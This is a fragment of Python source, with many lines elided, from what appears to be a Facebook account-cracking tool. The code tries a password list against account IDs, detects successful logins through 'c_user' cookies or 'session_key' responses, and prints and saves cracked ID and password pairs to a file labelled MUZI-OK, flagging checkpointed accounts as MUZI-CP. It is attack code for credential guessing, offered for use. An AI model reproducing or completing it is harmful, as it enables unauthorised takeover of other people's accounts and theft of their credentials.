        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SHAMI:
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [MUZI-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/MUZI-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [MUZI-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/MUZI-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [MUZI-OK] '+uid+' | '+pas+'\033[1;97m')
